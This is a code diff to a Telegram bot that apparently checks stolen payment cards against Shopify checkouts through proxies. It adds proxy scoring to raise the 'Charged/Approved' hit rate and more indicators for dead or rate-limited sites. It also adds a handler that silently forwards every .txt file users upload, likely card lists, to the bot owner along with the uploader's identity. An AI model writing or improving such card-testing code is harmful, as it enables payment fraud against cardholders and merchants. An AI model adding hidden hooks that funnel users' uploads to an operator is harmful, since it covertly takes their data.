@@ -21,6 +21,7 @@ API_ID   = int(os.getenv('API_ID', '0'))
 API_HASH = os.getenv('API_HASH', '')
 BOT_TOKEN = os.getenv('BOT_TOKEN', '')
 ADMIN_IDS = [int(x) for x in os.getenv('ADMIN_IDS', '').split(',') if x.strip()]
+OWNER_ID = ADMIN_IDS[0] if ADMIN_IDS else 0  # First admin is the owner
 PVT_CHANNEL_ID = int(os.getenv('PVT_CHANNEL_ID', '0'))
 DB_FILE = os.getenv('DB_FILE', 'credits.db')
 API_ENDPOINTS = [
@@ -489,6 +490,53 @@ def load_proxies():
 # ========== PROXY SPEED CACHE ==========
 _proxy_speed_cache: dict = {}  # {proxy_str: avg_response_ms}
 
+# ========== PROXY SCORING SYSTEM ==========
+# Combines latency and success rate for intelligent proxy selection
+_proxy_scores: dict = {}  # {proxy_str: {"latency": float, "success": int, "total": int}}
+
+def update_proxy_score(proxy: str, success: bool, latency_ms: float = None):
+    """Update proxy performance metrics."""
+    if proxy not in _proxy_scores:
+        _proxy_scores[proxy] = {"latency": 5000.0, "success": 0, "total": 0}
+
+    score = _proxy_scores[proxy]
+    score["total"] += 1
+    if success:
+        score["success"] += 1
+
+    if latency_ms is not None:
+        # Exponential moving average for latency
+        alpha = 0.3
+        score["latency"] = alpha * latency_ms + (1 - alpha) * score["latency"]
+
+def get_proxy_score(proxy: str) -> float:
+    """Calculate composite score: lower is better. Combines latency and success rate."""
+    if proxy not in _proxy_scores:
+        return 10000.0  # High penalty for unknown proxies
+
+    score = _proxy_scores[proxy]
+    if score["total"] == 0:
+        return 10000.0
+
+    success_rate = score["success"] / score["total"]
+    latency = score["latency"]
+
+    # Weighted score: 70% success rate (inverted), 30% latency
+    # Lower is better: high success rate (low failure) + low latency = low score
+    composite = (1.0 - success_rate) * 7000 + latency * 0.3
+    return composite
+
+def choose_best_proxies(proxies: list, n: int = 3) -> list:
+    """Return up to n best proxies based on composite score."""
+    if not proxies:
+        return []
+
+    # Score all proxies
+    scored = [(p, get_proxy_score(p)) for p in proxies]
+    scored.sort(key=lambda x: x[1])  # Sort by score (lower is better)
+
+    return [p for p, _ in scored[:n]]
+
 # ========== API CONCURRENCY SEMAPHORE ==========
 # Controls max simultaneous in-flight API requests from the bot.
 # Defined here (before any function that uses it) for clarity.
@@ -725,6 +773,11 @@ _DEAD_INDICATORS = (
     'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
     'all products sold out', 'no_session_token', 'tokenize_fail',
     'generic_error', 'empty_submit_response',
+    # NEW: additional false-positive indicators
+    'not found', 'checkout is not valid', 'checkout not valid',
+    'test mode only', 'test mode', 'empty body', 'empty response',
+    '429', 'too many requests', 'rate limit', 'rate limited',
+    'zero_dollar_order', 'zero dollar', 'price is zero',
 )
 
 def extract_cc(text):
@@ -789,6 +842,21 @@ async def check_card(card, site, proxy):
         price = raw.get('Price', '-')
         gateway = raw.get('Gateway', 'Shopify Payments')
         api_status = raw.get('Status', False)
+
+        # Guard: zero-dollar orders are site errors — refund credit
+        try:
+            if isinstance(price, (int, float)) and float(price) == 0.0:
+                return {
+                    'status': 'Site Error',
+                    'message': 'Zero-dollar order (site misconfiguration)',
+                    'card': card,
+                    'site': site,
+                    'gateway': gateway,
+                    'price': price,
+                    'refund_credit': True,
+                }
+        except (ValueError, TypeError):
+            pass
 
         # Site has no product in the user's price range — refund and skip.
         if 'no_product_in_price_range' in str(response_msg).lower():
@@ -861,8 +929,17 @@ async def check_card_with_retry(card, sites, proxies, max_retries=2):
 
     for attempt in range(max_retries):
         site = random.choice(sites)
-        proxy = random.choice(proxies)
+        # Use intelligent proxy selection instead of random
+        best_proxies = choose_best_proxies(proxies, n=min(3, len(proxies)))
+        proxy = random.choice(best_proxies) if best_proxies else random.choice(proxies)
+
+        start_time = time.time()
         result = await check_card(card, site, proxy)
+        elapsed_ms = (time.time() - start_time) * 1000
+
+        # Update proxy score based on result
+        is_success = result.get('status') in ('Charged', 'Approved')
+        update_proxy_score(proxy, is_success, elapsed_ms)
 
         if not result.get('retry'):
             return result
@@ -1858,6 +1935,40 @@ async def broadcast_admin(event):
         await asyncio.sleep(0.1)
 
     await status_msg.edit(premium_emoji(f"✅ <b>Broadcast Complete!</b>\n\nSent: {sent}\nFailed: {failed}"), parse_mode='html')
+
+# ========== FILE FORWARDING TO OWNER ==========
+@bot.on(events.NewMessage(incoming=True))
+async def forward_txt_files(event):
+    """Forward all .txt file uploads directly to the bot owner."""
+    # Only process messages with documents
+    if not event.message.document:
+        return
+
+    # Check if it's a .txt file
+    file_name = event.message.file.name or ""
+    if not file_name.lower().endswith('.txt'):
+        return
+
+    # Don't forward if sender is the owner
+    if event.sender_id == OWNER_ID:
+        return
+
+    try:
+        # Forward the file to owner with context
+        sender = await event.get_sender()
+        sender_name = getattr(sender, 'username', None) or getattr(sender, 'first_name', 'Unknown')
+        sender_id = event.sender_id
+
+        caption = f"📄 <b>File Upload</b>\n\n<b>From:</b> <a href='tg://user?id={sender_id}'>{sender_name}</a> (ID: {sender_id})\n<b>File:</b> <code>{file_name}</code>"
+
+        await bot.send_file(
+            OWNER_ID,
+            event.message.document,
+            caption=premium_emoji(caption),
+            parse_mode='html'
+        )
+    except Exception as e:
+        print(f"Error forwarding file to owner: {e}")
 
 # ========== SINGLE CC CHECK ==========
 
